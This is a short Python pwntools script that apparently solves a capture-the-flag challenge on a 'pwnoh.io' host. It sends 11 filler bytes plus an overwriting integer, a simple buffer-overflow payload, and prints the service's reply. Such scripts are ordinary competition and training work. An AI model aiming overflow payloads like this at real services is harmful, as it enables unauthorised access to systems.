from pwn import remote

host = "viewer.challs.pwnoh.io"
port = 1337

p = remote(host, port, ssl=True)
payload = b"A"*11 + b"\x03\x00\x00\x00" + b"\n"
print(payload)
p.send(payload)
print(p.recv(timeout=3).decode(errors='ignore'))
print(p.recvline(timeout=3).decode(errors='ignore'))# header line

p.close()
